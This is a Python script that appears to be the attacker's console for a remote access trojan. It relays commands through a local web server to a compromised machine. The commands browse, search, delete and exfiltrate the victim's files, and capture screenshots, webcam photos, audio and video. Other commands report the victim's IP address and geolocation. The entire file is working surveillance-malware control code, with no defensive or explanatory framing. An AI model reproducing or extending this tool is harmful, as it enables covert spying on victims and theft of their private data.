import requests
from bs4 import BeautifulSoup
import lxml
from itertools import zip_longest
import os
import wget

def get_sign():
    done = requests.get(website + 'done').text
    while str(done) != "done":
        done = requests.get(website + 'done').text
    requests.get(website + 'done/false')

def get_path():
    global current_path
    if requests.get(website + 'response').text == "This drive doesn't exist !":
        print("  This drive doesn't exist !")
    else:
        current_path = requests.get(website + 'response').text

def print_files():
    content = requests.get(website + 'files').content
    soup = BeautifulSoup(content, "lxml")
    files = soup.find_all("h6", {"class":"file"})
    print("\n")
    for file in files:
        print("  " + file.text)
    print("\n")
    requests.get(website + 'files/false')

def download_files():
    content = requests.get(website + 'files').content
    soup = BeautifulSoup(content, "lxml")
    files = soup.find_all("h6", {"class":"file"})
    for file in files:
        wget.download(website + 'static/' + file.text, "all_files")


website = 'http://127.0.0.1:5000/'
current_path = ""

os.system('cls')
requests.get(website + 'addget_path/n/n/n')
get_sign()
get_path()

while True:
    try:
        command = input("\n  $" + current_path.replace("|", "/") + '>')
    except:
        exit()
    if command == "ls":
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        print_files()
    elif command == "exit":
        requests.get(website + 'add' + command + '/n/n/n')
    elif command == "cls":
        os.system('cls')
    elif command == "echo":
        filename = input("  Filename:  ")
        text = input("  text:  ")
        requests.get(website + 'add' + command + '/' + filename.replace("\\", "|") + '/' + text.replace("\\n", "\n") + '/n')
    elif command == "view_files":
        path = input("  Path:  ")
        requests.get(website + 'add' + command + '/n/n/' + path.replace("\\", "|"))
        get_sign()
        print_files()
    elif command == "recv_file":
        filename = input("  Filename:  ")
        requests.get(website + 'add' + command + '/' + filename + '/n/n')
        get_sign()
        wget.download(website + 'static/' + filename)
    elif command == "recv_files":
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        download_files()
    elif command == "get_ip":
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        ip = requests.get(website + 'response').text
        print("  " + ip)
    elif command == "screen":
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        wget.download(website + 'static/screenshot.jpg')
    elif command == "take_pic":
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        wget.download(website + 'static/capture.jpg')
    elif command == "send_file":
        filename = input("  Filename:  ")
        requests.post(website + 'upload', files={'file':open(filename, 'rb')})
        requests.get(website + 'add' + command + '/' + filename + '/n/n')
    elif command == "cd..":
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        get_path()
    elif command == "get_loc":
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        g = (requests.get(website + 'response').text).replace("<[OK] Ipinfo - Geocode ", "")
        print(g.replace('>', ''))
    elif "rec_aud" in command:
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        wget.download(website + 'static/audio.wav')
    elif "rec_vid" in command:
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        filename = requests.get(website + 'response').text
        wget.download(website + 'static/' + filename)
    elif "take_vid" in command:
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        wget.download(website + 'static/video.avi')
    elif "url" in command:
        requests.get(website + 'add' + command.replace("/", "|") + '/n/n/n')
    elif "cd" in command:
        requests.get(website + 'add' + command + '/n/n/n')
        get_sign()
        get_path()
    elif "md" in command:
        requests.get(website + 'add' + command + '/n/n/n')
    elif "rd" in command:
        requests.get(website + 'add' + command + '/n/n/n')
    elif "del" in command:
        requests.get(website + 'add' + command + '/n/n/n')
    elif "search" in command:
        path = input("  Path:  ")
        print("  Searching...")
        requests.get(website + 'add' + command + '/n/n/' + path.replace("\\", "|"))
        get_sign()
        print_files()
    elif "call" in command:
        requests.get(website + 'add' + command + '/n/n/n')
    else:
        print("This command doesn't exist !")
